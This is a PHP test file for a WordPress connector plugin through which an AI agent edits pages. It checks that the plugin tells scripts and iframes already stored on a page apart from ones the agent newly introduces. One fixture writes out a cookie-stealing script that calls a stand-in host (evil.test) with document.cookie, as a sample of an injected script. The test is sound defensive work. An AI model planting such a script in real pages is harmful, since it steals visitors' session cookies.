<?php
/**
 * Saving one block must not destroy markup in another.
 *
 * The agent account has no unfiltered_html, so WordPress filters what it
 * saves. That is correct for anything the agent writes and wrong for
 * content that was already stored: inserting a CTA banner on a real
 * customer page silently destroyed the JSON-LD schema sitting in an
 * untouched block further down.
 *
 * Run: php tests/kses-impact.php
 *
 * @package wp-mcp-connector-plus
 */

require_once __DIR__ . '/bootstrap.php';

// Stand-in for wp_kses_post: strips the constructs WordPress strips.
function wp_kses_post( $content ) {
	$content = preg_replace( '#<script\b[^>]*>.*?</script>#is', '', (string) $content );
	$content = preg_replace( '#<iframe\b[^>]*>.*?</iframe>#is', '', $content );
	return $content;
}

require_once dirname( __DIR__ ) . '/includes/content.php';

$fail = 0;

function check( $ok, $name, $detail = '' ) {
	global $fail;
	if ( $ok ) {
		echo "  \033[32m✓\033[0m {$name}\n";
		return;
	}
	echo "  \033[31m✗\033[0m {$name}\n";
	if ( '' !== $detail ) {
		echo "      {$detail}\n";
	}
	++$fail;
}

echo "\n\033[1mWirkung des Speicher-Filters\033[0m\n";

$schema = '<!-- wp:core/html --><script type="application/ld+json">{"@type":"FAQPage"}</script><!-- /wp:core/html -->';
$clean  = '<!-- wp:core/paragraph --><p>Text</p><!-- /wp:core/paragraph -->';

// Nothing to filter at all.
$i = wpmcp_kses_impact( $clean, $clean . $clean );
check( false === $i['alters'], 'harmloser Inhalt wird nicht angetastet' );
check( false === $i['introduces'], 'und bringt nichts Neues ein' );

// The reported case: the page already had a script, the change adds a block.
$i = wpmcp_kses_impact( $clean . $schema, $clean . $clean . $schema );
check( true === $i['alters'], 'bestehendes Script wuerde gefiltert' );
check(
	false === $i['introduces'],
	'wird aber NICHT als neu eingebracht gewertet',
	'sonst verweigert der Konnektor jeden Schreibvorgang auf so einer Seite'
);
check( in_array( '<script', $i['affected'], true ), 'das betroffene Konstrukt wird benannt' );

// The agent tries to write a new script.
$i = wpmcp_kses_impact( $clean, $clean . $schema );
check( true === $i['introduces'], 'ein neu geschriebenes Script wird erkannt' );

// One existing script, agent adds a second: that second one is new.
$i = wpmcp_kses_impact( $clean . $schema, $clean . $schema . $schema );
check( true === $i['introduces'], 'ein zweites Script neben einem bestehenden ist neu' );

// Removing the block that held it is never an introduction.
$i = wpmcp_kses_impact( $clean . $schema, $clean );
check( false === $i['introduces'], 'Entfernen bringt nichts ein' );
check( false === $i['alters'], 'und es bleibt nichts zu filtern' );

// iframes count too, and independently of scripts.
$frame = '<!-- wp:core/html --><iframe src="https://example.test"></iframe><!-- /wp:core/html -->';
$i     = wpmcp_kses_impact( $clean . $schema, $clean . $schema . $frame );
check( true === $i['introduces'], 'ein neuer iframe neben einem bestehenden Script ist neu' );

echo "\n\033[1mOperationsart ist irrelevant\033[0m\n";

// The report suspected that a replace op somewhere on the page makes the
// preservation fail. The decision never looks at operations at all — it
// compares the markup before and after. These prove it.
$page_with_schema = $clean . $schema . $clean;

// set_attrs-like: same markup, one attribute different.
$after = str_replace( '<p>Text</p>', '<p>Neu</p>', $page_with_schema );
$i     = wpmcp_kses_impact( $page_with_schema, $after );
check( true === $i['alters'] && false === $i['introduces'], 'Attributaenderung: Script wird erhalten' );

// replace-like: a whole block swapped for different markup.
$after = str_replace(
	'<!-- wp:core/paragraph --><p>Text</p><!-- /wp:core/paragraph -->',
	'<!-- wp:core/heading --><h2>Ersetzt</h2><!-- /wp:core/heading -->',
	$page_with_schema
);
$i = wpmcp_kses_impact( $page_with_schema, $after );
check( true === $i['alters'] && false === $i['introduces'], 'Blockersetzung: Script wird ebenso erhalten' );

// Many operations at once, including removals.
$after = '<!-- wp:core/heading --><h2>A</h2><!-- /wp:core/heading -->' . $schema;
$i     = wpmcp_kses_impact( $page_with_schema, $after );
check( false === $i['introduces'], 'viele Operationen gleichzeitig aendern daran nichts' );

echo "\n\033[1mDie eigentliche Ursache\033[0m\n";

// A duplicate starts from nothing, so by the counting rule its content
// would look like newly introduced markup — which is why duplication has
// to be treated as the copy it is, not as agent-authored content.
$i = wpmcp_kses_impact( '', $page_with_schema );
check(
	true === $i['introduces'],
	'ein Duplikat sieht nach der Zaehlregel wie neu eingebrachtes Markup aus',
	'deshalb darf der Duplizier-Pfad nicht dieselbe Regel anwenden'
);

echo "\n\033[1mTausch statt Zaehlung\033[0m\n";

// Counting occurrences had a hole: swap the page's own JSON-LD for a
// script of the agent's making in one save and the total never moves.
// The comparison is over the fragments themselves, so identity decides.
$own = '<!-- wp:core/html --><script>fetch("https://evil.test?c="+document.cookie)</script><!-- /wp:core/html -->';
$i   = wpmcp_kses_impact( $clean . $schema, $clean . $own );
check(
	true === $i['introduces'],
	'ein ausgetauschtes Script wird erkannt, obwohl die Anzahl gleich bleibt',
	'die Zaehlregel haette hier "nichts Neues" gemeldet'
);

// The same page, unchanged: nothing is introduced.
$i = wpmcp_kses_impact( $clean . $schema, $clean . $schema );
check( false === $i['introduces'], 'dasselbe Script an derselben Stelle ist nichts Neues' );

// Moving an existing script elsewhere on the page is not introducing it.
$i = wpmcp_kses_impact( $clean . $schema, $schema . $clean );
check( false === $i['introduces'], 'ein verschobenes Script ist nichts Neues' );

// One character changed inside an existing script is a different script.
$i = wpmcp_kses_impact( $clean . $schema, $clean . str_replace( 'FAQPage', 'Article', $schema ) );
check( true === $i['introduces'], 'ein geaenderter Script-Inhalt zaehlt als neu' );

// What the message names is what is new, not everything present.
$i = wpmcp_kses_impact( $clean . $schema, $clean . $schema . $frame );
check( array( '<iframe' ) === $i['added'], 'gemeldet wird nur das Neue', implode( ', ', $i['added'] ) );
check( count( $i['affected'] ) === 2, 'waehrend "betroffen" beides nennt', implode( ', ', $i['affected'] ) );

echo "\n";
if ( 0 === $fail ) {
	echo "\033[32mFilter-Analyse in Ordnung.\033[0m\n";
	exit( 0 );
}
echo "\033[31m{$fail} Pruefung(en) fehlgeschlagen.\033[0m\n";
exit( 1 );
